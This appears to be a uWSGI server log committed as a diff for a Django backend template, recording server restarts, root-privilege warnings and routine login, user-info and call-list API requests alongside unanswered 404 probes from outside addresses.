+[pid: 29746|app: 0|req: 122/171] 61.191.198.244 () {44 vars in 721 bytes} [Thu Nov 29 23:12:41 2018] OPTIONS /user/logout => generated 0 bytes in 4 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 0)
+[pid: 29746|app: 0|req: 123/172] 61.191.198.244 () {46 vars in 745 bytes} [Thu Nov 29 23:12:41 2018] POST /user/logout => generated 34 bytes in 4 msecs (HTTP/1.1 200) 6 headers in 211 bytes (1 switches on core 1)
+{'code': 20000, 'data': {'token': 'admin'}}
+[pid: 29745|app: 0|req: 50/173] 61.191.198.244 () {46 vars in 807 bytes} [Thu Nov 29 23:13:03 2018] POST /user/login => generated 43 bytes in 137 msecs (HTTP/1.1 200) 7 headers in 356 bytes (1 switches on core 0)
+[pid: 29745|app: 0|req: 51/174] 61.191.198.244 () {44 vars in 734 bytes} [Thu Nov 29 23:13:05 2018] GET /user/info?token=admin => generated 144 bytes in 11 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 1)
+[pid: 29746|app: 0|req: 124/175] 61.191.198.244 () {44 vars in 732 bytes} [Thu Nov 29 23:17:52 2018] OPTIONS /data/calllistinfo => generated 0 bytes in 3 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 0)
+[pid: 29746|app: 0|req: 125/176] 61.191.198.244 () {44 vars in 727 bytes} [Thu Nov 29 23:17:53 2018] GET /data/calllistinfo => generated 565 bytes in 10 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 1)
+[pid: 29746|app: 0|req: 126/177] 185.153.198.208 () {38 vars in 490 bytes} [Thu Nov 29 23:25:09 2018] POST / => generated 74 bytes in 10 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 29746|app: 0|req: 127/178] 61.191.198.244 () {44 vars in 739 bytes} [Thu Nov 29 23:28:57 2018] OPTIONS /user/info?token=admin => generated 0 bytes in 4 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 1)
+[pid: 29746|app: 0|req: 128/179] 61.191.198.244 () {44 vars in 734 bytes} [Thu Nov 29 23:28:57 2018] GET /user/info?token=admin => generated 144 bytes in 12 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 0)
+[pid: 29746|app: 0|req: 129/180] 61.191.198.244 () {44 vars in 732 bytes} [Thu Nov 29 23:28:58 2018] OPTIONS /data/calllistinfo => generated 0 bytes in 1 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 1)
+[pid: 29745|app: 0|req: 52/181] 61.191.198.244 () {44 vars in 727 bytes} [Thu Nov 29 23:28:58 2018] GET /data/calllistinfo => generated 565 bytes in 9 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 0)
+[pid: 29746|app: 0|req: 130/182] 172.104.92.166 () {32 vars in 401 bytes} [Thu Nov 29 23:28:59 2018] GET / => generated 74 bytes in 4 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+SIGINT/SIGQUIT received...killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+goodbye to uWSGI.
+VACUUM: pidfile removed.
+*** Starting uWSGI 2.0.17.1 (64bit) on [Thu Nov 29 15:34:54 2018] ***
+compiled with version: 7.3.0 on 27 November 2018 15:24:12
+os: Linux-4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018
+nodename: vultr.guest
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /root
+writing pidfile to /home/wwww/django-backend-template/pid.uwsgi
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/wwww/django-backend-template
+your processes number limit is 1685
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 127.0.0.1:9090 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.7 (default, Oct 22 2018, 11:32:17)  [GCC 8.2.0]
+Python main interpreter initialized at 0x55a74c78e100
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 250032 bytes (244 KB) for 4 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 1 seconds on interpreter 0x55a74c78e100 pid: 17526 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 17526)
+spawned uWSGI worker 1 (pid: 17528, cores: 2)
+spawned uWSGI worker 2 (pid: 17529, cores: 2)
+[pid: 17528|app: 0|req: 1/1] 61.191.198.244 () {44 vars in 721 bytes} [Thu Nov 29 23:35:03 2018] OPTIONS /user/logout => generated 0 bytes in 16 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 0)
+[pid: 17528|app: 0|req: 2/2] 61.191.198.244 () {46 vars in 741 bytes} [Thu Nov 29 23:35:04 2018] POST /user/logout => generated 34 bytes in 30 msecs (HTTP/1.1 200) 6 headers in 211 bytes (1 switches on core 1)
+{'code': 20000, 'data': {'token': 'admin'}}
+[pid: 17528|app: 0|req: 3/3] 61.191.198.244 () {46 vars in 807 bytes} [Thu Nov 29 23:35:08 2018] POST /user/login => generated 43 bytes in 260 msecs (HTTP/1.1 200) 7 headers in 346 bytes (1 switches on core 0)
+[pid: 17528|app: 0|req: 4/4] 61.191.198.244 () {44 vars in 734 bytes} [Thu Nov 29 23:35:08 2018] GET /user/info?token=admin => generated 144 bytes in 11 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 1)
+[pid: 17528|app: 0|req: 5/5] 61.191.198.244 () {44 vars in 727 bytes} [Thu Nov 29 23:35:09 2018] GET /data/calllistinfo => generated 565 bytes in 6 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 0)
+SIGINT/SIGQUIT received...killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+goodbye to uWSGI.
+VACUUM: pidfile removed.
+*** Starting uWSGI 2.0.17.1 (64bit) on [Thu Nov 29 15:42:57 2018] ***
+compiled with version: 7.3.0 on 27 November 2018 15:24:12
+os: Linux-4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018
+nodename: vultr.guest
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /root
+writing pidfile to /home/wwww/django-backend-template/pid.uwsgi
+detected binary path: /usr/local/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /home/wwww/django-backend-template
+your processes number limit is 1685
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 127.0.0.1:9090 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 3.6.7 (default, Oct 22 2018, 11:32:17)  [GCC 8.2.0]
+Python main interpreter initialized at 0x557bc8c3d100
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 250032 bytes (244 KB) for 4 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x557bc8c3d100 pid: 17588 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 17588)
+spawned uWSGI worker 1 (pid: 17590, cores: 2)
+spawned uWSGI worker 2 (pid: 17591, cores: 2)
+[pid: 17591|app: 0|req: 1/1] 61.191.198.244 () {44 vars in 721 bytes} [Thu Nov 29 23:54:00 2018] OPTIONS /user/logout => generated 0 bytes in 11 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 2/2] 61.191.198.244 () {46 vars in 741 bytes} [Thu Nov 29 23:54:00 2018] POST /user/logout => generated 34 bytes in 30 msecs (HTTP/1.1 200) 6 headers in 211 bytes (1 switches on core 1)
+{'code': 20000, 'data': {'token': 'admin'}}
+[pid: 17591|app: 0|req: 3/3] 61.191.198.244 () {48 vars in 837 bytes} [Thu Nov 29 23:54:12 2018] POST /user/login => generated 43 bytes in 225 msecs (HTTP/1.1 200) 7 headers in 356 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 4/4] 61.191.198.244 () {44 vars in 739 bytes} [Thu Nov 29 23:54:13 2018] OPTIONS /user/info?token=admin => generated 0 bytes in 1 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 1)
+[pid: 17590|app: 0|req: 1/5] 61.191.198.244 () {44 vars in 734 bytes} [Thu Nov 29 23:54:13 2018] GET /user/info?token=admin => generated 144 bytes in 51 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 5/6] 61.191.198.244 () {44 vars in 732 bytes} [Thu Nov 29 23:54:15 2018] OPTIONS /data/calllistinfo => generated 0 bytes in 1 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 1)
+[pid: 17590|app: 0|req: 2/7] 61.191.198.244 () {44 vars in 727 bytes} [Thu Nov 29 23:54:16 2018] GET /data/calllistinfo => generated 565 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 6/8] 185.153.198.206 () {38 vars in 490 bytes} [Fri Nov 30 00:31:25 2018] POST / => generated 74 bytes in 49 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 7/9] 185.153.198.206 () {38 vars in 490 bytes} [Fri Nov 30 01:05:48 2018] POST / => generated 74 bytes in 8 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 8/10] 185.153.198.206 () {38 vars in 490 bytes} [Fri Nov 30 01:38:29 2018] POST / => generated 74 bytes in 7 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 9/11] 185.153.198.206 () {38 vars in 490 bytes} [Fri Nov 30 02:40:31 2018] POST / => generated 74 bytes in 13 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 10/12] 185.153.198.206 () {38 vars in 490 bytes} [Fri Nov 30 03:13:31 2018] POST / => generated 74 bytes in 9 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 11/13] 185.153.198.206 () {38 vars in 490 bytes} [Fri Nov 30 04:04:22 2018] POST / => generated 74 bytes in 7 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 12/14] 185.153.198.208 () {38 vars in 490 bytes} [Fri Nov 30 04:27:44 2018] POST / => generated 74 bytes in 7 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 13/15] 185.153.198.206 () {38 vars in 490 bytes} [Fri Nov 30 05:40:36 2018] POST / => generated 74 bytes in 12 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 14/16] 185.153.198.208 () {38 vars in 490 bytes} [Fri Nov 30 06:53:22 2018] POST / => generated 74 bytes in 8 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 15/17] 185.153.198.208 () {38 vars in 490 bytes} [Fri Nov 30 07:41:34 2018] POST / => generated 74 bytes in 10 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 16/18] 54.91.89.120 () {34 vars in 499 bytes} [Fri Nov 30 08:32:37 2018] GET / => generated 74 bytes in 6 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 17/19] 185.153.198.208 () {38 vars in 490 bytes} [Fri Nov 30 09:18:48 2018] POST / => generated 74 bytes in 11 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 18/20] 185.153.198.208 () {38 vars in 490 bytes} [Fri Nov 30 09:43:49 2018] POST / => generated 74 bytes in 6 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 19/21] 185.153.198.206 () {38 vars in 490 bytes} [Fri Nov 30 11:20:26 2018] POST / => generated 74 bytes in 9 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+{'code': 20000, 'data': {'token': 'admin'}}
+[pid: 17591|app: 0|req: 20/22] 61.191.198.244 () {48 vars in 864 bytes} [Fri Nov 30 11:43:37 2018] POST /user/login => generated 43 bytes in 157 msecs (HTTP/1.1 200) 7 headers in 356 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 21/23] 61.191.198.244 () {44 vars in 739 bytes} [Fri Nov 30 11:43:38 2018] OPTIONS /user/info?token=admin => generated 0 bytes in 2 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 0)
+[pid: 17590|app: 0|req: 3/24] 61.191.198.244 () {44 vars in 734 bytes} [Fri Nov 30 11:43:38 2018] GET /user/info?token=admin => generated 144 bytes in 18 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 0)
+[pid: 17590|app: 0|req: 4/25] 61.191.198.244 () {44 vars in 732 bytes} [Fri Nov 30 11:43:44 2018] OPTIONS /data/calllistinfo => generated 0 bytes in 1 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 22/26] 61.191.198.244 () {44 vars in 727 bytes} [Fri Nov 30 11:43:44 2018] GET /data/calllistinfo => generated 565 bytes in 7 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 23/27] 185.153.198.208 () {38 vars in 490 bytes} [Fri Nov 30 13:20:48 2018] POST / => generated 74 bytes in 11 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17590|app: 0|req: 5/28] 185.153.198.208 () {38 vars in 490 bytes} [Fri Nov 30 14:09:21 2018] POST / => generated 74 bytes in 63 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 24/29] 185.153.198.206 () {38 vars in 490 bytes} [Fri Nov 30 14:58:09 2018] POST / => generated 74 bytes in 8 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 25/30] 185.153.198.206 () {38 vars in 490 bytes} [Fri Nov 30 16:14:50 2018] POST / => generated 74 bytes in 11 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+{'code': 20000, 'data': {'token': 'admin'}}
+[pid: 17591|app: 0|req: 26/31] 61.191.198.244 () {48 vars in 864 bytes} [Fri Nov 30 16:26:44 2018] POST /user/login => generated 43 bytes in 265 msecs (HTTP/1.1 200) 7 headers in 356 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 27/32] 61.191.198.244 () {44 vars in 739 bytes} [Fri Nov 30 16:26:45 2018] OPTIONS /user/info?token=admin => generated 0 bytes in 4 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 1)
+[pid: 17590|app: 0|req: 6/33] 61.191.198.244 () {44 vars in 734 bytes} [Fri Nov 30 16:26:45 2018] GET /user/info?token=admin => generated 144 bytes in 25 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 0)
+{'code': 20000, 'data': {'token': 'admin'}}
+[pid: 17590|app: 0|req: 7/34] 61.191.198.244 () {48 vars in 883 bytes} [Fri Nov 30 16:26:53 2018] POST /user/login => generated 43 bytes in 155 msecs (HTTP/1.1 200) 7 headers in 356 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 28/35] 61.191.198.244 () {44 vars in 739 bytes} [Fri Nov 30 16:26:54 2018] OPTIONS /user/info?token=admin => generated 0 bytes in 2 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 0)
+[pid: 17590|app: 0|req: 8/36] 61.191.198.244 () {44 vars in 734 bytes} [Fri Nov 30 16:26:54 2018] GET /user/info?token=admin => generated 144 bytes in 9 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 29/37] 61.191.198.244 () {44 vars in 732 bytes} [Fri Nov 30 16:27:19 2018] OPTIONS /data/calllistinfo => generated 0 bytes in 1 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 1)
+[pid: 17590|app: 0|req: 9/38] 61.191.198.244 () {44 vars in 727 bytes} [Fri Nov 30 16:27:20 2018] GET /data/calllistinfo => generated 565 bytes in 6 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 30/39] 185.153.198.208 () {38 vars in 490 bytes} [Fri Nov 30 16:37:04 2018] POST / => generated 74 bytes in 8 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 31/40] 185.153.198.208 () {38 vars in 490 bytes} [Fri Nov 30 19:56:15 2018] POST / => generated 74 bytes in 9 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 32/41] 185.153.198.206 () {38 vars in 490 bytes} [Fri Nov 30 21:05:33 2018] POST / => generated 74 bytes in 9 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 33/42] 185.153.198.206 () {38 vars in 490 bytes} [Fri Nov 30 21:29:58 2018] POST / => generated 74 bytes in 7 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 34/43] 185.153.198.208 () {38 vars in 490 bytes} [Fri Nov 30 21:55:38 2018] POST / => generated 74 bytes in 9 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 35/44] 185.153.198.208 () {38 vars in 490 bytes} [Fri Nov 30 22:19:03 2018] POST / => generated 74 bytes in 6 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 36/45] 185.153.198.208 () {38 vars in 490 bytes} [Fri Nov 30 23:07:05 2018] POST / => generated 74 bytes in 8 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 37/46] 185.153.198.206 () {38 vars in 490 bytes} [Fri Nov 30 23:56:21 2018] POST / => generated 74 bytes in 6 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 38/47] 185.153.198.208 () {38 vars in 490 bytes} [Sat Dec  1 01:08:27 2018] POST / => generated 74 bytes in 11 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 39/48] 185.153.198.208 () {38 vars in 490 bytes} [Sat Dec  1 01:58:00 2018] POST / => generated 74 bytes in 8 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 40/49] 185.153.198.208 () {38 vars in 490 bytes} [Sat Dec  1 02:19:42 2018] POST / => generated 74 bytes in 6 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 41/50] 185.153.198.208 () {38 vars in 490 bytes} [Sat Dec  1 02:45:24 2018] POST / => generated 74 bytes in 8 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 42/51] 185.153.198.208 () {38 vars in 490 bytes} [Sat Dec  1 04:23:19 2018] POST / => generated 74 bytes in 9 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 43/52] 185.153.198.208 () {38 vars in 490 bytes} [Sat Dec  1 04:47:17 2018] POST / => generated 74 bytes in 7 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 44/53] 185.153.198.208 () {38 vars in 490 bytes} [Sat Dec  1 05:39:04 2018] POST / => generated 74 bytes in 12 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+{'code': 20000, 'data': {'token': 'admin'}}
+[pid: 17591|app: 0|req: 45/54] 61.191.198.244 () {48 vars in 864 bytes} [Sat Dec  1 05:56:59 2018] POST /user/login => generated 43 bytes in 166 msecs (HTTP/1.1 200) 7 headers in 356 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 46/55] 61.191.198.244 () {44 vars in 739 bytes} [Sat Dec  1 05:56:59 2018] OPTIONS /user/info?token=admin => generated 0 bytes in 2 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 0)
+[pid: 17590|app: 0|req: 10/56] 61.191.198.244 () {44 vars in 734 bytes} [Sat Dec  1 05:56:59 2018] GET /user/info?token=admin => generated 144 bytes in 19 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 0)
+[pid: 17590|app: 0|req: 11/57] 61.191.198.244 () {44 vars in 732 bytes} [Sat Dec  1 05:57:03 2018] OPTIONS /data/calllistinfo => generated 0 bytes in 1 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 47/58] 61.191.198.244 () {44 vars in 727 bytes} [Sat Dec  1 05:57:03 2018] GET /data/calllistinfo => generated 565 bytes in 5 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 48/59] 61.191.198.244 () {44 vars in 727 bytes} [Sat Dec  1 05:57:08 2018] GET /data/calllistinfo => generated 565 bytes in 4 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 1)
+[pid: 17590|app: 0|req: 12/60] 185.153.198.206 () {38 vars in 490 bytes} [Sat Dec  1 06:50:43 2018] POST / => generated 74 bytes in 14 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 49/61] 185.153.198.206 () {38 vars in 490 bytes} [Sat Dec  1 07:41:36 2018] POST / => generated 74 bytes in 11 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 50/62] 185.153.198.208 () {38 vars in 490 bytes} [Sat Dec  1 08:06:35 2018] POST / => generated 74 bytes in 10 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 51/63] 185.153.198.208 () {38 vars in 490 bytes} [Sat Dec  1 08:55:10 2018] POST / => generated 74 bytes in 9 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 52/64] 185.153.198.208 () {38 vars in 490 bytes} [Sat Dec  1 09:44:01 2018] POST / => generated 74 bytes in 9 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 53/65] 185.153.198.206 () {38 vars in 490 bytes} [Sat Dec  1 10:35:22 2018] POST / => generated 74 bytes in 9 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 54/66] 185.153.198.208 () {38 vars in 490 bytes} [Sat Dec  1 11:22:10 2018] POST / => generated 74 bytes in 9 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 55/67] 185.153.198.206 () {38 vars in 490 bytes} [Sat Dec  1 14:36:03 2018] POST / => generated 74 bytes in 11 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 56/68] 185.153.198.206 () {38 vars in 490 bytes} [Sat Dec  1 15:24:49 2018] POST / => generated 74 bytes in 33 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 57/69] 185.153.198.208 () {38 vars in 490 bytes} [Sat Dec  1 15:45:47 2018] POST / => generated 74 bytes in 7 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 58/70] 185.153.198.206 () {38 vars in 490 bytes} [Sat Dec  1 16:11:45 2018] POST / => generated 74 bytes in 10 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 59/71] 185.153.198.208 () {38 vars in 490 bytes} [Sat Dec  1 16:59:54 2018] POST / => generated 74 bytes in 7 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 60/72] 61.191.198.244 () {44 vars in 739 bytes} [Sat Dec  1 17:03:40 2018] OPTIONS /user/info?token=admin => generated 0 bytes in 3 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 61/73] 61.191.198.244 () {44 vars in 734 bytes} [Sat Dec  1 17:03:40 2018] GET /user/info?token=admin => generated 144 bytes in 31 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 62/74] 61.191.198.244 () {44 vars in 732 bytes} [Sat Dec  1 17:03:44 2018] OPTIONS /data/calllistinfo => generated 0 bytes in 0 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 1)
+[pid: 17590|app: 0|req: 13/75] 61.191.198.244 () {44 vars in 727 bytes} [Sat Dec  1 17:03:45 2018] GET /data/calllistinfo => generated 565 bytes in 11 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 63/76] 61.191.198.244 () {44 vars in 727 bytes} [Sat Dec  1 17:03:57 2018] GET /data/calllistinfo => generated 565 bytes in 6 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 1)
+[pid: 17590|app: 0|req: 14/77] 61.191.198.244 () {44 vars in 754 bytes} [Sat Dec  1 17:04:00 2018] OPTIONS /data/call-detail-list => generated 0 bytes in 2 msecs (HTTP/1.1 200) 8 headers in 465 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 64/78] 61.191.198.244 () {48 vars in 844 bytes} [Sat Dec  1 17:04:00 2018] POST /data/call-detail-list => generated 4795 bytes in 7 msecs (HTTP/1.1 200) 6 headers in 205 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 65/79] 61.191.198.244 () {44 vars in 727 bytes} [Sat Dec  1 17:06:55 2018] GET /data/calllistinfo => generated 565 bytes in 10 msecs (HTTP/1.1 200) 6 headers in 204 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 66/80] 185.153.198.206 () {38 vars in 490 bytes} [Sat Dec  1 17:23:43 2018] POST / => generated 74 bytes in 15 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 67/81] 185.153.198.206 () {38 vars in 490 bytes} [Sat Dec  1 17:45:28 2018] POST / => generated 74 bytes in 8 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 68/82] 185.153.198.206 () {38 vars in 490 bytes} [Sat Dec  1 18:56:03 2018] POST / => generated 74 bytes in 8 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 69/83] 185.153.198.206 () {38 vars in 490 bytes} [Sat Dec  1 19:19:42 2018] POST / => generated 74 bytes in 10 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 70/84] 185.153.198.206 () {38 vars in 490 bytes} [Sat Dec  1 19:46:14 2018] POST / => generated 74 bytes in 7 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 71/85] 185.153.198.206 () {38 vars in 490 bytes} [Sat Dec  1 20:57:46 2018] POST / => generated 74 bytes in 11 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 72/86] 185.153.198.208 () {38 vars in 490 bytes} [Sun Dec  2 00:24:28 2018] POST / => generated 74 bytes in 12 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
+[pid: 17591|app: 0|req: 73/87] 185.153.198.208 () {38 vars in 490 bytes} [Sun Dec  2 00:51:35 2018] POST / => generated 74 bytes in 11 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 1)
+[pid: 17591|app: 0|req: 74/88] 185.153.198.206 () {38 vars in 490 bytes} [Sun Dec  2 01:15:08 2018] POST / => generated 74 bytes in 9 msecs (HTTP/1.1 404) 4 headers in 114 bytes (1 switches on core 0)
